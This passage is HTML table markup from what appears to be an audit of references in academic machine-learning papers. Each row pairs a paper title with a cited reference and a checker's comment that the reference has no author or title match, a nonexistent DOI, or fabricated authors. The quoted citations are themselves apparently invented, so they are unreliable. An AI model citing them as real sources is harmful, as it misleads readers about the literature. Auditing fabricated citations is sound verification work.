      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Self-supervised Learning of Echocardiographic Video Representations via Online Cluster Distillation&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Fenglin Ding, Debesh Jha, Maria Härgestam, Pål Halvorsen, Michael A Riegler, Dag Johansen, Ronny Hänsch, and Håvard Stensland. Vits: Vision transformer for video self-supervised pretraining of surgical phase recognition. In International Conference on Medical Image Computing and Computer-Assisted Intervention, pages 293-302. Springer, 2022.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No title or author match. Proceedings from this conference are split into volumes, but the citation doesn't have a volume number.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:64.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;PANTHER: Generative Pretraining Beyond Language for Sequential User Behavior Modeling&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Humberto Acevedo-Viloria, Juan Martinez, and Maria Garcia. Relational graph convolutional networks for financial fraud detection. IEEE Transactions on Knowledge and Data Engineering, 33(7):1357-1370, 2021. doi: 10.1109/TKDE.2020.3007655.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. Doesn't exist in the cited publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:64.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;PANTHER: Generative Pretraining Beyond Language for Sequential User Behavior Modeling&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Majid Zolghadr, Mohsen Jamali, and Jiawei Zhang. Diffurecsys: Diffusion-based generative modeling for sequential recommendation. Proceedings of the ACM Web Conference (WWW), pages 2156-2165, 2024. doi: 10.1145/3545678.3557899.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. DOI doesn't exist.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;LiteReality: Graphic-Ready 3D Scene Reconstruction from RGB-D Scans&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Bernd Kerbl, Thomas Müller, and Paolo Favaro. Efficient 3d gaussian splatting for real-time neural rendering. In CVPR, 2022. 2, 3&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Loosely matches this article, but only one author and part of the title actually match.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;LiteReality: Graphic-Ready 3D Scene Reconstruction from RGB-D Scans&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Punchana Khungurn, Edward H. Adelson, Julie Dorsey, and Holly Rushmeier. Matching real-world material appearance. TPAMI, 2015. 6&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No clear match. Two authors and the subject match this article.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:52.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;When and How Unlabeled Data Provably Improve In-Context Learning&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Ashish Kumar, Logan Engstrom, Andrew Ilyas, and Dimitris Tsipras. Understanding self-training for gradient-boosted trees. In Advances in Neural Information Processing Systems (NeurIPS), volume 33, pp. 1651-1662, 2020.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No title or author match. Doesn't exist in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:52.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;When and How Unlabeled Data Provably Improve In-Context Learning&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Chuang Fan, Shipeng Liu, Seyed Motamed, Shiyu Zhong, Silvio Savarese, Juan Carlos Niebles, Anima Anandkumar, Adrien Gaidon, and Stefan Scherer. Expectation maximization pseudo labels. arXiv preprint arXiv:2305.01747, 2023.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;This paper exists, but all the authors are fabricated.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;DualCnst: Enhancing Zero-Shot Out-of-Distribution Detection via Text-Image Consistency in Vision-Language Models&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;T. Qiao, W. Liu, Z. Xie, H. Xu, J. Lin, J. Huang, and Y. Yang, "Clip-score: A robust scoring metric for text-to-image generation," arXiv preprint arXiv:2201.07519, 2022.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No clear author or title matches. Title loosely matches this article. ArXiv ID leads here.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Optimal Rates for Generalization of Gradient Descent for Deep ReLU Classification&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Yunwen Lei, Puyu Wang, Yiming Ying, and Ding-Xuan Zhou. Optimization and generalization of gradient descent for shallow relu networks with minimal width. preprint, 2024.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No title match. Authors match this paper.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:52.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;GeoDynamics: A Geometric State‑Space Neural Network for Understanding Brain Dynamics on Riemannian Manifolds&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Uher, R., Goodman, R., Moutoussis, M., Brammer, M., Williams, S.C.R., Dolan, R.J.: Cognitive and neural predictors of response to cognitive behavioral therapy for depression: a review of the evidence. Journal of Affective Disorders 169, 94-104 (2014)&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No exact title or author match. Loose title match with this article. Doesn't exist in the journal volume&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:64.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Robust Label Proportions Learning&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Scan&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Junyeong Lee, Yiseong Kim, Seungju Park, and Hyunjik Lee. Softmatch: Addressing the quantity-quality trade-off in semi-supervised learning. In Advances in Neural Information Processing Systems (NeurIPS), volume 36, pages 18315-18327, 2023.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Title matches this paper. No match in NeurIPS volume 36.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:52.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;NFL-BA: Near-Field Light Bundle Adjustment for SLAM in Dynamic Lighting&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Z. Zhu, T. Yu, X. Zhang, J. Li, Y. Zhang, and Y. Fu. Neuralrgb-d: Neural representations for depth estimation and scene mapping. In Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition, 2022.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. Doesn't exist in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;NFL-BA: Near-Field Light Bundle Adjustment for SLAM in Dynamic Lighting&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Y. Zhang, M. Oswald, and D. Cremers. Airslam: Illumination-invariant hybrid slam. In International Conference on Computer Vision (ICCV), pages 2345-2354, 2023.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. Doesn't exist in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Geometric Imbalance in Semi-Supervised Node Classification&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Yihong Zhu, Junxian Li, Xianfeng Han, Shirui Pan, Liang Yao, and Chengqi Wang. Spectral contrastive graph clustering. In International Conference on Learning Representations, 2022.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No title or author match. This paper has a similar title, but there's no match in the ICLR 2022 database.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:52.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Geometric Imbalance in Semi-Supervised Node Classification&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
